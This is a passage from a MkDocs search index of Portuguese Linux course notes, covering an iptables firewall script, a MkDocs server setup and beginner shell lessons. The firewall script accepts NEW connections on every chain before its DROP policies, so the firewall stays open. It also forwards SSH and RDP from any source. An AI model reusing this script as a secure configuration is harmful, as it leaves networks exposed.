<pre><code>/etc/init.d/procps restart\n</code></pre>"},{"location":"Firewall_Server/#instalacao-do-pacote-do-iptables","title":"Instala\u00e7\u00e3o do pacote do iptables:","text":"<pre><code>apt remove nftables &amp;&amp; apt-get install iptables\n</code></pre>"},{"location":"Firewall_Server/#criando-o-arquivo-com-as-regras","title":"Criando o arquivo com as regras:","text":"<pre><code>vim /usr/local/bin/firewall\n</code></pre> <pre><code>###########################################\n##       Firewall Projeto Officinas      ##\n##       eduardo.charquero@gmail.com     ##\n##       vers\u00e3o 05.2025                  ##\n##       Licen\u00e7a GPL3                    ##\n###########################################\n\n\n#!/usr/bin/env bash\n\n# enp0s8 = PLACA EXTERNA\n# enp0s3 = PLACA INTERNA\n\n\n# CARREGANDO M\u00d3DULOS DO KERNEL:\nmodprobe iptable_nat\nmodprobe iptable_mangle\nmodprobe iptable_filter\n\n\n# LIMPANDO AS CADEIAS DO NETFILTER:\niptables -F\niptables -t nat -F\niptables -t mangle -F\niptables -t filter -F\n\n\n# PERMITE RETORNO DE CONEX\u00d5ES J\u00c1 ENCAMINHADAS:\niptables -A INPUT -m state --state ESTABLISHED,RELATED,NEW -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED,NEW -j ACCEPT\niptables -A FORWARD -m state --state ESTABLISHED,RELATED,NEW -j ACCEPT\n\n\n# BLOQUEANDO ACESSO AO FIREWALL:\niptables -P INPUT DROP\n# BLOQUEANDO SA\u00cdDA DO FIREWALL:\niptables -P OUTPUT DROP\n# BLOQUEANDO PASSAGENS PELO FIREWALL:\niptables -P FORWARD DROP\n\n\n# ATIVANDO MASCARAMENTO DA REDE INTERNA:\niptables -t nat -A POSTROUTING -s 192.168.70.0/24 -o enp0s3 -j MASQUERADE\n\n\n# LIBERANDO ACESSO POR SSH NO FIREWALL:\niptables -I INPUT -p tcp -d 192.168.70.254 -s 192.168.70.0/24 --dport 22254 -j ACCEPT\n# TESTES DE REJECT E DROP\n# iptables -I INPUT -p tcp -d 192.168.70.254 -s 192.168.70.0/24 --dport 22254 -j REJECT\n# iptables -I INPUT -p tcp -d 192.168.70.254 -s 192.168.70.0/24 --dport 22254 -j DROP\n\n\n# LIBERANDO O PING PARA O FIREWALL:\niptables -A INPUT -p icmp --icmp-type ping -j ACCEPT\n# TESTES DE REJECT E DROP\n# iptables -A INPUT -p icmp --icmp-type ping -j REJECT\n# iptables -A INPUT -p icmp --icmp-type ping -j DROP\n\n\n# LIBERANDO INTERNET PARA O FIREWALL:\niptables -A OUTPUT -p tcp --dport 80 -j ACCEPT\niptables -A OUTPUT -p tcp --dport 443 -j ACCEPT\niptables -A OUTPUT -p tcp --dport 53 -j ACCEPT\niptables -A OUTPUT -p udp --dport 53 -j ACCEPT\n\n\n# LIBERANDO INTERNET PARA PASSAGEM DA REDE:\niptables -A FORWARD -p tcp --dport 80 -j ACCEPT\niptables -A FORWARD -p tcp --dport 443 -j ACCEPT\niptables -A FORWARD -p tcp --dport 53 -j ACCEPT\niptables -A FORWARD -p udp --dport 53 -j ACCEPT\n\n\n# REDIRECT SSH PARA DCMASTER:\niptables -t nat -A PREROUTING -p tcp -s 0/0 -d 192.168.0.254 --dport 22250 -j DNAT --to 192.168.70.250:22250\niptables -t filter -A FORWARD -p tcp -s 0/0 -d 192.168.70.250 --dport 22250 -j ACCEPT\n\n\n# REDIRECT SSH PARA ARQUIVOS:\niptables -t nat -A PREROUTING -p tcp -s 0/0 -d 192.168.0.254 --dport 22200 -j DNAT --to 192.168.70.200:22200\niptables -t filter -A FORWARD -p tcp -s 0/0 -d 192.168.70.200 --dport 22200 -j ACCEPT\n\n\n# Liberando RDP:\niptables -A FORWARD -p tcp --dport 3389 -j ACCEPT\niptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 3389 -j DNAT --to 192.168.70.171:3389\n\n\n# Redirect da rede interna pra porta do Squid:\n#iptables -A FORWARD -p tcp --dport 80 -j DROP\n#iptables -A FORWARD -p tcp --dport 443 -j DROP\n#iptables -t nat -A PREROUTING -i enp7s0 -p tcp --dport 80 -j REDIRECT --to-port 3128\n</code></pre>"},{"location":"Firewall_Server/#setando-permissao-de-execucao-ao-shell-script-e-executando","title":"Setando permiss\u00e3o de execu\u00e7\u00e3o ao Shell-script e executando:","text":"<pre><code>chmod +x /usr/local/bin/firewall\n</code></pre> <pre><code>sh /usr/local/bin/firewall\n</code></pre>"},{"location":"Firewall_Server/#salvando-as-regras-do-iptables","title":"Salvando as regras do iptables:","text":"<pre><code>apt-get install iptables-persistent\n</code></pre> <pre><code>iptables-save &gt; /etc/iptables/rules.v4\n</code></pre> <pre><code>/etc/init.d/netfilter-persistent restart\n</code></pre> <pre><code>systemctl is-enabled netfilter-persistent.service\n</code></pre> <pre><code>systemctl enable netfilter-persistent.service\n</code></pre> <pre><code>systemctl status netfilter-persistent.service\n</code></pre> <p>that's all folks!</p>"},{"location":"Mkdocs_Server/","title":"\ud83d\udcc1 Servidor de documenta\u00e7\u00e3o MkDocs","text":"<p>MkDocs \u00e9 um gerador de site est\u00e1tico r\u00e1pido, simples e absolutamente lindo que \u00e9 voltado para a documenta\u00e7\u00e3o do projeto de constru\u00e7\u00e3o. Os arquivos de origem da documenta\u00e7\u00e3o s\u00e3o gravados em Markdown e configurados com um \u00fanico arquivo de configura\u00e7\u00e3o YAML.</p>"},{"location":"Mkdocs_Server/#setando-e-validando-o-hostname-do-servidor-mkdocs","title":"Setando e validando o hostname do Servidor MkDocs:","text":"<pre><code>hostnamectl set-hostname mkdocs\n</code></pre>"},{"location":"Mkdocs_Server/#configurando-o-arquivo-de-hosts","title":"Configurando o arquivo de hosts:","text":"<pre><code>vim /etc/hosts\n</code></pre> <pre><code>.0.0.1             localhost\n127.0.1.1          mkdocs.officinas.edu        mkdocs\n192.168.70.150     fileserver.officinas.edu    fileserver\n192.168.70.200     dcslave.officinas.edu       dcslave\n192.168.70.222     mkdocs.officinas.edu        mkdocs\n192.168.70.250     dcmaster.officinas.edu      dcmaster\n192.168.70.254     firewall.officinas.edu      firewall\n</code></pre> <pre><code>hostname -f\n</code></pre>"},{"location":"Mkdocs_Server/#setando-ip-fixo-no-servidor-dcmaster","title":"Setando ip fixo no servidor dcmaster:","text":"<pre><code>vim /etc/network/interfaces\n</code></pre> <pre><code>iface enp1s0 inet static\naddress           192.168.70.222\nnetmask           255.255.255.0\ngateway           192.168.70.254\ndns-nameserver    192.168.70.254 #(firewall)\ndns-search        officinas.edu\n</code></pre>"},{"location":"Mkdocs_Server/#setando-endereco-do-firewall-como-resolvedor-externo","title":"Setando endere\u00e7o do firewall como resolvedor externo:","text":"<pre><code>vim /etc/resolv.conf\n</code></pre> <pre><code>domain             officinas.edu\nsearch             officinas.edu.\nnameserver         192.168.70.254 #(firewall)\n</code></pre>"},{"location":"Mkdocs_Server/#validando-o-ip-da-placa","title":"Validando o ip da placa:","text":"<pre><code>ip -c addr\n</code></pre> <pre><code>ip -br link\n</code></pre>"},{"location":"Mkdocs_Server/#instalacao-dos-pacotes-necessarios-ao-debian","title":"Instala\u00e7\u00e3o dos pacotes necess\u00e1rios ao Debian:","text":"<pre><code>apt install wget net-tools tree python3-pip vim\n</code></pre>"},{"location":"Mkdocs_Server/#instalacao-dos-pacotes-do-mkdocs","title":"Instala\u00e7\u00e3o dos pacotes do MkDocs:","text":"<pre><code>apt install mkdocs mkdocs-material-extensions mkdocs-nature mkdocs-click\n</code></pre>"},{"location":"Mkdocs_Server/#validando-versao-do-pacote","title":"Validando vers\u00e3o do pacote:","text":"<pre><code>mkdocs --version\n</code></pre>"},{"location":"Mkdocs_Server/#criando-um-novo-projeto","title":"Criando um novo projeto:","text":"<pre><code>cd /opt/\nmkdocs new mkdocs\ncd /opt/mkdocs\n</code></pre>"},{"location":"Mkdocs_Server/#valide-a-criacao-da-estrutura","title":"Valide a cria\u00e7\u00e3o da estrutura:","text":"<pre><code>tree\n</code></pre> <pre><code>\u251c\u2500\u2500 docs\n\u2502   \u2514\u2500\u2500 index.md\n\u251c\u2500\u2500 mkdocs.yml\n\u2514\u2500\u2500 site\n    \u251c\u2500\u2500 404.html\n    \u251c\u2500\u2500 css\n    \u2502   \u251c\u2500\u2500 base.css\n    \u2502   \u251c\u2500\u2500 bootstrap.min.css\n    \u2502   \u2514\u2500\u2500 font-awesome.min.css\n    \u251c\u2500\u2500 fonts\n    \u2502   \u251c\u2500\u2500 FontAwesome.otf\n    \u2502   \u251c\u2500\u2500 fontawesome-webfont.eot\n    \u2502   \u251c\u2500\u2500 fontawesome-webfont.svg\n    \u2502   \u251c\u2500\u2500 fontawesome-webfont.ttf\n    \u2502   \u251c\u2500\u2500 fontawesome-webfont.woff\n    \u2502   \u2514\u2500\u2500 fontawesome-webfont.woff2\n    \u251c\u2500\u2500 img\n    \u2502   \u251c\u2500\u2500 favicon.ico\n    \u2502   \u2514\u2500\u2500 grid.png\n    \u251c\u2500\u2500 index.html\n    \u251c\u2500\u2500 js\n    \u2502   \u251c\u2500\u2500 base.js\n    \u2502   \u251c\u2500\u2500 bootstrap.min.js\n    \u2502   \u2514\u2500\u2500 jquery-1.10.2.min.js\n    \u251c\u2500\u2500 search\n    \u2502   \u251c\u2500\u2500 lunr.js\n    \u2502   \u251c\u2500\u2500 main.js\n    \u2502   \u251c\u2500\u2500 search_index.json\n    \u2502   \u2514\u2500\u2500 worker.js\n    \u251c\u2500\u2500 sitemap.xml\n    \u2514\u2500\u2500 sitemap.xml.gz\n</code></pre>"},{"location":"Mkdocs_Server/#valida-o-ip-do-servidor","title":"Valida o ip do Servidor:","text":"<pre><code>ip -c addr\n</code></pre>"},{"location":"Mkdocs_Server/#inicia-o-servidor","title":"Inicia o Servidor:","text":"<pre><code>mkdocs serve -a 192.168.70.222:8000\n</code></pre> <pre><code>INFO     -  Building documentation...\nINFO     -  Cleaning site directory\nINFO     -  Documentation built in 0.05 seconds\nINFO     -  [10:41:22] Serving on http://192.168.70.222:8000/\n</code></pre>"},{"location":"Mkdocs_Server/#agora-abra-no-seu-navegador-o-endereco","title":"Agora abra no seu navegador o endere\u00e7o:","text":"<pre><code>http://192.168.70.222:8000\n</code></pre>"},{"location":"Mkdocs_Server/#edite-o-arquivo-de-configuracao-principal","title":"Edite o arquivo de configura\u00e7\u00e3o principal:","text":"<p><pre><code>vim /opt/mkdocs/mkdocs.yml\n</code></pre> <pre><code>site_name: Officina's\ntheme:\n  name: readthedocs\n</code></pre></p>"},{"location":"Mkdocs_Server/#restart-do-servico","title":"Restart do Servi\u00e7o:","text":"<pre><code>systemctl restart mkdocs\n</code></pre>"},{"location":"Mkdocs_Server/#agora-vamos-criar-2-arquivos-de-exemplo-sobremd-e-instalacaomd","title":"Agora vamos criar 2 arquivos de exemplo, \"Sobre.md\" e \"Instala\u00e7\u00e3o.md\":","text":"<pre><code>vim /opt/mkdocs/docs/sobre.md\n</code></pre> <pre><code># Markdown\n\n## O que \u00e9 Markdown ?\n\nMarkdown \u00e9 uma linguagem de marca\u00e7\u00e3o leve com sintaxe de formata\u00e7\u00e3o de texto simples projetada para que ela possa ser convertida em HTML e muitos outros formatos usando uma ferramenta com o mesmo nome. Markdown \u00e9 usado frequentemente para formatar arquivos readme, para escrever mensagens em f\u00f3runs de discuss\u00e3o on-line e para criar texto rico usando um editor de texto simples.\n\n## Porque usar Markdown?\n\n* **F\u00c1CIL** : A sintaxe \u00e9 t\u00e3o f\u00e1cil que voc\u00ea pode aprender em um minuto ou dois, em seguida, escreva sem perceber nada estranho ou nerd.\n\n* **R\u00c1PIDO** : Ele economiza tempo em compara\u00e7\u00e3o com outros tipos de arquivos / formatos de texto. Isso ajuda a aumentar a produtividade e os fluxos de trabalho do escritor.\n\n* **LIMPO** : Tanto a sintaxe como a sa\u00edda s\u00e3o limpas, sem confus\u00e3o com nossos olhos e simples de gerenciar.\n\n* **FLEX\u00cdVEL** : Com apenas algumas configura\u00e7\u00f5es, o seu texto ser\u00e1 traduzido atravessando qualquer plataforma l\u00e1 fora, edit\u00e1vel em qualquer software de edi\u00e7\u00e3o de texto e convers\u00edvel para uma ampla variedade de formatos.\n\n\n**Em resumo**, os usu\u00e1rios comuns achar\u00e3o \u00fatil em todos os casos, especialmente quando voc\u00ea precisar de algo melhor que o texto simples, mas menos funcional do que o Microsoft Word.\n\n**Para desenvolvedores**, Se voc\u00ea \u00e9 pregui\u00e7oso para escrever c\u00f3digo HTML, voc\u00ea vai adorar o markdown. **Al\u00e9m disso**, **Github** e muitos sites favorecem o markdown para o arquivo readme de projetos. Isso significa que voc\u00ea vai encontrar o markdown em sua vida de uma forma ou de outra.\n</code></pre> <p><pre><code>vim /opt/mkdocs/docs/instala\u00e7\u00e3o.md\n</code></pre> <pre><code># apt install mkdocs\n# pip3 install mkdocs\n</code></pre> <pre><code>Crie um novo projeto chamado mkdocs e construa um novo site:\n```bash\n# cd /opt/\n# mkdocs new mkdocs\n# cd /opt/mkdocs\n# mkdocs build\n</code></pre></p>"},{"location":"Mkdocs_Server/#inicie-o-servico","title":"Inicie o servi\u00e7o:","text":"<pre><code># mkdocs serve -a 192.168.70.222:8000\n</code></pre>"},{"location":"Mkdocs_Server/#e-possivel-inserir-figuras-na-documentacao-com-a-seguinte-estrutura","title":"\u00c9 poss\u00edvel inserir figuras na documenta\u00e7\u00e3o, com a seguinte estrutura:","text":"<pre><code>![Descri\u00e7\u00e3o da imagem](caminho/para/a/imagem.jpg)\n</code></pre>"},{"location":"Mkdocs_Server/#ou","title":"ou","text":"<pre><code>![Descri\u00e7\u00e3o da imagem](URL_da_imagem)\n</code></pre>"},{"location":"Mkdocs_Server/#o-mkdocs-pode-gerar-conteudo-estatico-para-ser-inserido-no-apache-server-ou-nginx-server","title":"O MKDocs pode gerar conte\u00fado est\u00e1tico, para ser inserido no Apache Server ou NGINX Server:","text":"<pre><code>mkdocs build\n</code></pre>"},{"location":"Mkdocs_Server/#vai-criar-um-diretorio-chamado-de-site-que-pode-ser-copiado-para-varwwwhtml","title":"Vai criar um diret\u00f3rio chamado de site, que pode ser copiado para /var/www/html:","text":"<pre><code>cp -rv /opt/mkdocs/site /var/www/html\n</code></pre>"},{"location":"Mkdocs_Server/#seta-permissoes-no-diretorio","title":"Seta permiss\u00f5es no diret\u00f3rio:","text":"<pre><code>chown -R www-data:www-data /var/www/html\nchmod -R 755 /var/www/html \n</code></pre>"},{"location":"Mkdocs_Server/#restart-do-apache-server","title":"Restart do Apache Server:","text":"<pre><code>systemctl restart apache2\n</code></pre>"},{"location":"Mkdocs_Server/#acesse-pelo-seu-navegador-web-favorito","title":"Acesse pelo seu navegador Web favorito:","text":"<pre><code>http://192.168.70.251/site\n</code></pre> <p>THAT\u2019S ALL FOLKS!!</p>"},{"location":"Modulo_103.1-aula00/","title":"\ud83d\udc27 M\u00f3dulo 103.1 AULA 00","text":""},{"location":"Modulo_103.1-aula00/#comandos-basicos-do-terminal-linux","title":"COMANDOS B\u00c1SICOS DO TERMINAL LINUX","text":""},{"location":"Modulo_103.1-aula00/#navegacao-e-manipulacao-de-arquivos","title":"NAVEGA\u00c7\u00c3O E MANIPULA\u00c7\u00c3O DE ARQUIVOS","text":""},{"location":"Modulo_103.1-aula00/#o-comandols","title":"O COMANDO<code>ls</code>","text":"<p>Lista os arquivos e diret\u00f3rios no diret\u00f3rio atual.</p>"},{"location":"Modulo_103.1-aula00/#o-comando-cd","title":"O COMANDO <code>cd</code>","text":"<p>Muda o diret\u00f3rio atual para o especificado.</p>"},{"location":"Modulo_103.1-aula00/#o-comando-pwd","title":"O COMANDO <code>pwd</code>","text":"<p>Exibe o caminho completo do diret\u00f3rio atual.</p>"},{"location":"Modulo_103.1-aula00/#o-comando-clear","title":"O COMANDO <code>clear</code>","text":"<p>Limpa a tela do terminal.</p>"},{"location":"Modulo_103.1-aula00/#o-comando-whoami","title":"O COMANDO <code>whoami</code>","text":"<p>Exibe o nome do usu\u00e1rio atual.</p>"},{"location":"Modulo_103.1-aula00/#o-comando-touch","title":"O COMANDO <code>touch</code>","text":"<p>Cria um arquivo vazio ou atualiza a data de modifica\u00e7\u00e3o de um arquivo existente.</p>"},{"location":"Modulo_103.1-aula00/#o-comando-cat","title":"O COMANDO <code>cat</code>","text":"<p>Concatena e exibe o conte\u00fado de um ou mais arquivos.</p>"},{"location":"Modulo_103.1-aula00/#o-comando-tac","title":"O COMANDO <code>tac</code>","text":"<p>Concatena e exibe o conte\u00fado de um ou mais arquivos em ordem inversa.</p>"},{"location":"Modulo_103.1-aula00/#o-comando-cp","title":"O COMANDO <code>cp</code>","text":"<p>Copia arquivos ou diret\u00f3rios.</p>"},{"location":"Modulo_103.1-aula00/#o-comando-mv","title":"O COMANDO <code>mv</code>","text":"<p>Move ou renomeia arquivos ou diret\u00f3rios.</p>"},{"location":"Modulo_103.1-aula00/#o-comando-find","title":"O COMANDO <code>find</code>","text":"<p>Procura por arquivos e diret\u00f3rios em um diret\u00f3rio especificado.</p>"},{"location":"Modulo_103.1-aula00/#o-comando-less","title":"O COMANDO <code>less</code>","text":"<p>Exibe o conte\u00fado de um arquivo uma p\u00e1gina por vez.</p>"},{"location":"Modulo_103.1-aula00/#o-comando-grep","title":"O COMANDO <code>grep</code>","text":"<p>Filtra um arquivo de texto buscando a express\u00e3o que voc\u00ea digitou.</p>"},{"location":"Modulo_103.1-aula00/#o-comando-mkdir","title":"O COMANDO <code>mkdir</code>","text":"<p>Cria um diret\u00f3rio vazio.</p>"},{"location":"Modulo_103.1-aula00/#o-comando-rmdir","title":"O COMANDO <code>rmdir</code>","text":"<p>Remove um diret\u00f3rio vazio.</p>"},{"location":"Modulo_103.1-aula00/#o-comando","title":"O COMANDO <code>&gt;</code>","text":"<p>Cria um arquivo vazio.</p>"},{"location":"Modulo_103.1-aula00/#o-comando-rm","title":"O COMANDO <code>rm</code>","text":"<p>Remove um arquivos.</p>"},{"location":"Modulo_103.1-aula00/#informacoes-do-sistema","title":"INFORMA\u00c7\u00d5ES DO SISTEMA","text":""},{"location":"Modulo_103.1-aula00/#o-comando-hostname","title":"O COMANDO <code>hostname</code>","text":"<p>Exibe o nome do host do sistema.</p>"},{"location":"Modulo_103.1-aula00/#o-comando-uname","title":"O COMANDO <code>uname</code>","text":"<p>Exibe informa\u00e7\u00f5es sobre o sistema operacional.</p>"},{"location":"Modulo_103.1-aula00/#o-comando-ip-a","title":"O COMANDO <code>ip a</code>","text":"<p>Exibe informa\u00e7\u00f5es sobre as interfaces de rede.</p>"},{"location":"Modulo_103.1-aula00/#o-comando-ping","title":"O COMANDO <code>ping</code>","text":"<p>Envia pacotes ICMP ECHO_REQUEST para testar a conectividade de rede.</p>"},{"location":"Modulo_103.1-aula00/#o-comando-free","title":"O COMANDO <code>free</code>","text":"<p>Exibe a quantidade de mem\u00f3ria livre e usada no sistema.</p>"},{"location":"Modulo_103.1-aula00/#o-comando-top","title":"O COMANDO <code>top</code>","text":"<p>Exibe os processos em execu\u00e7\u00e3o e o uso de recursos do sistema em tempo real.</p>"},{"location":"Modulo_103.1-aula00/#o-comando-df-h","title":"O COMANDO <code>df -h</code>","text":"<p>Exibe o uso de espa\u00e7o em disco em um formato leg\u00edvel por humanos.</p>"},{"location":"Modulo_103.1-aula00/#historico","title":"HIST\u00d3RICO","text":""},{"location":"Modulo_103.1-aula00/#o-comando-history","title":"O COMANDO <code>history</code>","text":"<p>Exibe o hist\u00f3rico de comandos executados no terminal.</p>"},{"location":"Modulo_103.1-aula00/#direcionadores","title":"DIRECIONADORES","text":""},{"location":"Modulo_103.1-aula00/#o-direcionador-simples-historyhistoricotxt","title":"O DIRECIONADOR SIMPLES <code>history</code>&gt;<code>historico.txt</code>","text":"<p>Salva o hist\u00f3rico de comandos em um arquivo chamado <code>historico.txt</code>.</p>"},{"location":"Modulo_103.1-aula00/#o-direcionador-duplo-historyhistorico2txt","title":"O DIRECIONADOR DUPLO <code>history</code>&gt;&gt;<code>historico2.txt</code>","text":"<p>Adiciona o hist\u00f3rico de comandos a um arquivo chamado <code>historico2.txt</code> sem sobrescrever o conte\u00fado existente.</p> <p>THAT\u2019S ALL FOLKS!!</p>"},{"location":"Modulo_103.1-aula01/","title":"\ud83d\udc27 M\u00f3dulo 103.1 AULA 01","text":""},{"location":"Modulo_103.1-aula01/#o-shell","title":"O SHELL","text":""},{"location":"Modulo_103.1-aula01/#sh-dash-bash-csh-zsh","title":"sh, dash, bash, csh, zsh ...","text":"<p>O shell \u00e9 uma interface ou ambiente de intera\u00e7\u00e3o entre o usu\u00e1rio e o kernel (ou n\u00facleo), que por sua vez, interage com o hardware, que o usu\u00e1rio n\u00e3o consegue fazer.</p> <pre><code>HARDWARE &lt;---&gt; KERNEL &lt;---&gt; SHELL &lt;---&gt; USU\u00c1RIO\n</code></pre> <p>Vamos analizar um comando importante nessa aula, o comando <code>echo</code>:</p> <p>O comando <code>echo</code> imprime na tela o que for digitado na tela.</p> <p>Exemplo:</p> <pre><code>echo linux\n</code></pre> <pre><code>echo \"Debian Linux\"\n</code></pre> <p>Podemos consultar informa\u00e7\u00f5es sobre esse comando com o manual ou com o help, do comando:</p> <pre><code>help echo\n</code></pre> <pre><code>man echo\n</code></pre>"},{"location":"Modulo_103.1-aula01/#variaveis","title":"VARI\u00c1VEIS","text":"<p>Vari\u00e1veis s\u00e3o elementos que recebem e guardam um valor atribu\u00eddo a elas.</p> <p><code>VARI\u00c1VEIS != CONSTANTES</code></p> <p>Exemplo:</p> <pre><code>senha=123\n\necho senha\n\necho $senha\n</code></pre> <pre><code>senhas=\"123 321\"\n\necho $senhas\n</code></pre> <pre><code>fruta=banana\n\necho $fruta\n</code></pre> <pre><code>nota=10\n\necho $nota\n</code></pre> <pre><code>nomes=\"joao jose maria\"\n\necho $nomes\n</code></pre> <p>Note que o <code>Shell</code> tem suas pr\u00f3prias vari\u00e1veis de trabalho, que podem ser consultadas atrav\u00e9s do comando <code>env</code> e pelo comando <code>set</code>:</p> <pre><code>env\n</code></pre> <pre><code>set\n</code></pre> <p>Uma vari\u00e1vel pode receber a sa\u00edda de um comando do sistema, desde que esteja entre <code>$()</code>:</p> <p>Exemplo, lembra do comando <code>whoami</code>? Vamos testar:</p> <pre><code>QuemSouEu=$(whoami)\n\necho $QuemSouEu\n</code></pre> <pre><code>Conteudo_Local=$(ls --color)\n\necho $Conteudo_Local\n</code></pre> <p>Expandindo o comando na execu\u00e7\u00e3o:</p> <pre><code>fruta='echo abacaxi'\n\necho $fruta\n</code></pre> <p><code>!=</code> de</p> <pre><code>fruta=$(echo abacaxi)\n\necho $fruta\n</code></pre> <p>Podemos criar vari\u00e1veis com:</p> <p><code>LETRAS MAI\u00daSCULAS</code> e/ou <code>MIN\u00daSCULAS</code> e/ou <code>N\u00daMEROS</code></p> <p>O \u00fanico caracter permitido na composi\u00e7\u00e3o de uma vari\u00e1vel \u00e9 o underline <code>_</code></p> <p>N\u00c3O podem conter acentos e N\u00c3O podem iniciar com n\u00fameros nem com qualquer outro caractere.</p> <pre><code>cria_pasta=$(mkdir PASTA-DE-FOTOS)\n\nls\n</code></pre> <p>NOTE QUE SE EU ENTRAR EM OUTRA SESS\u00c3O DE SHELL ESSAS VARI\u00c1VEIS N\u00c3O CONSTAM:</p> <p>Exemplo de chamada para outra sess\u00e3o de terminal:</p> <pre><code>bash\n</code></pre> <pre><code>echo $senhas\n\necho $fruta\n\necho $nota\n\necho $QuemSouEu\n</code></pre> <p>Fechando essa sess\u00e3o:</p> <pre><code>exit\n</code></pre> <p>Agora as vari\u00e1veis que criamos constam novamente:</p> <pre><code>echo $senhas\n\necho $fruta\n\necho $nota\n\necho $QuemSouEu\n</code></pre> <p>A n\u00e3o ser que vc use o comando <code>export</code>, que faz com que a vari\u00e1vel que voc\u00ea criou, seja enviada para as vari\u00e1veis do Sistema:</p> <pre><code>export fruta=kiwi\n</code></pre> <pre><code>env | grep fruta\n</code></pre> <p>Vai estar vis\u00edvel para essa sess\u00e3o de bash e seus processos filhos, apenas!</p> <p>Caso queira \"DES-exportar\"</p> <pre><code>unset fruta\n</code></pre>"},{"location":"Modulo_103.1-aula01/#comando-read-ou-leia","title":"COMANDO <code>read</code> OU LEIA","text":"<p>O comando <code>read</code> espera e armazena como vari\u00e1vel o valor que voc\u00ea digitar:</p> <pre><code>read \"x\"\n\ncaderno\n\necho $x\n</code></pre> <p>A vari\u00e1vel \u00e9 <code>x</code></p> <pre><code>read \"variavel14\"\n\nvassoura\n\necho $variavel14\n</code></pre> <p>A vari\u00e1vel \u00e9 <code>variavel14</code></p> <pre><code>read nota\n\necho $nota\n</code></pre> <p>A vari\u00e1vel \u00e9 <code>nota</code></p> <p>Adicionando a op\u00e7\u00e3o <code>-p</code> de prompt, ele fica interativo (por\u00e9m vai precisar de uma vari\u00e1vel de armazenamento):</p> <pre><code>read -p \"fruta\"\n\necho $fruta\n</code></pre> <p>Interage mas n\u00e3o armazenou nada, pois n\u00e3o criamos uma vari\u00e1vel!</p> <p>Agora vamos ler e armazenar uma vari\u00e1vel:</p> <pre><code>read -p \"fruta\" var\n\necho $var\n</code></pre> <p>CUIDADO para n\u00e3o dar um <code>echo</code> em <code>fruta</code>, e sim em <code>$var</code>!</p> <p>Vamos tentar de novo...</p> <pre><code>read -p \"fruta: \" x\n\necho $fruta ou echo $x ??\n</code></pre> <p>NOTE que deixamos um espa\u00e7o entre os <code>:</code> e <code>\"</code></p> <pre><code>unset fruta\n\nread -p \"Diga uma fruta: \" fruta\n\necho $fruta\n</code></pre> <p>Lendo uma vari\u00e1vel que armazena um nome:</p> <pre><code>read -p \"Digite seu nome: \" x\n\necho $x\n</code></pre> <pre><code>read -p \"Digite seu nome: \" y\n\necho $y\n</code></pre> <pre><code>read -p \"Digite seu nome: \" nome\n\necho $nome\n</code></pre> <p>Lendo uma vari\u00e1vel que armazena uma nota:</p> <pre><code>read -p \"Digite a nota do aluno: \" nota\n\necho $nota\n</code></pre>"},{"location":"Modulo_103.1-aula01/#os-comandos-builtin-comandos-internos-do-shell","title":"OS COMANDOS BUILTIN (Comandos Internos) DO <code>shell</code>","text":"<p>Podemos ver quais s\u00e3o os comandos internos ou builtins do shell com o <code>help</code>:</p> <pre><code>help\n\nhelp &lt;2xtab&gt;\n\nhelp echo\n\nhelp pwd\n\nhelp cd\n</code></pre> <p>NOTE que um <code>help ls</code> n\u00e3o retorna nada, pois o <code>ls</code> n\u00e3o \u00e9 um comando builtin.</p> <p>Tamb\u00e9m podemos comparar os comandos builtin e os comandos utilit\u00e1rios do sistema com o<code>type</code>:</p> <pre><code>type cd\n\ntype echo\n\ntype ls\n\ntype apt\n\ntype mv\n</code></pre> <p>Os comandos que N\u00c3O FOREM <code>builtin</code>, sempre ter\u00e3o sua localiza\u00e7\u00e3o <code>PATH</code> apontada. Os comandos builtin n\u00e3o tem esse apontamento.</p>"},{"location":"Modulo_103.1-aula01/#as-variaveis-de-ambiente-em-uso-pelo-sistema-operacional","title":"AS VARI\u00c1VEIS DE AMBIENTE EM USO PELO SISTEMA OPERACIONAl","text":"<p>As vari\u00e1veis de ambiente s\u00e3o definidas sempre em caixa alta. Sendo mostradas pelos comandos <code>set</code> ou <code>env</code>:</p> <p>O comando utilit\u00e1rio <code>env</code> MOSTRA APENAS AS VAR\u00c1VEIS GLOBAIS E AS EXPORTADAS NA SESS\u00c3O.</p> <p>O builtin <code>set</code> mostra todas as vari\u00e1veis internas e globais, mesmo sem exportar.</p> <pre><code>type env\n\ntype set\n\nenv | less\n\nset | less\n</code></pre> <pre><code>SHELL=/bin/bash\nLANGUAGE=pt_BR\nXCURSOR_SIZE=24\nLOGNAME=mevorak\nHOME=/home/mevorak\nUSER=mevorak\nHOSTNAME=mevorak\nPATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games\n...\n</code></pre> <p>Podemos realizar buscas por vari\u00e1veis espec\u00edficas:</p> <pre><code>echo $USER \n\necho $SHELL\n\necho $LANGUAGE\n</code></pre>"},{"location":"Modulo_103.1-aula01/#o-conceito-de-path-ou-caminho","title":"O CONCEITO DE <code>PATH</code> OU CAMINHO","text":"<p>Nos comandos dados ao <code>bash</code>, ele valida PRIMEIRO se \u00e9 um comando builtin, DEPOIS ele valida se \u00e9 um comando utilit\u00e1rio do sistema, da vari\u00e1vel <code>PATH</code>, DEPOIS ele imprime um erro de <code>COMMAND NOT FOUND</code>. bem l\u00f3gico!</p> <p>Exemplo::</p> <pre><code>meu_programa\n\nbash: meu_programa: comando n\u00e3o encontrado\n</code></pre> <p>MAS eu posso criar um arquivo com esse nome e fazer virar um <code>Shell script</code></p> <pre><code>echo \"ls\" &gt; meu_programa\n\nchmod +x meu_programa\n\n./meuprograma\n</code></pre> <p>Outros exemplos pr\u00e1ticos:</p> <pre><code>echo \"echo Ol\u00e1 mundo\" &gt; meu_programa\n\necho mkdir PASTA_D &gt; meu_programa\n</code></pre> <p>Ou ent\u00e3o posso jogar o meu programa no <code>PATH</code>do Sistema:</p> <pre><code>sudo mv meu_programa /usr/bin/\n</code></pre> <p>Agora ele consta nos comandos internos do Sistema e autocompleta com a tecla <code>TAB</code>:</p> <pre><code>meu_prog 2x&lt;TAB&gt;\n</code></pre>"},{"location":"Modulo_103.1-aula01/#a-linguagem-do-shell-script-modo-nao-interativo","title":"A LINGUAGEM DO <code>SHELL SCRIPT</code> (Modo n\u00e3o interativo)","text":"<p>Qual a vantagem de usar Shell script? Bom, podemos usar comandos em lote, ao inv\u00e9s de um de cada vez!</p> <p>Exemplo:</p> <pre><code>whoami\n\nhostname\n\nuptime -p\n\nuname -rms\n</code></pre> <p>Imagine se tivesse que validar essas informa\u00e7\u00f5es a cada troca de turno, por exemplo. </p> <p>Sendo MUITO mais pr\u00e1tico, 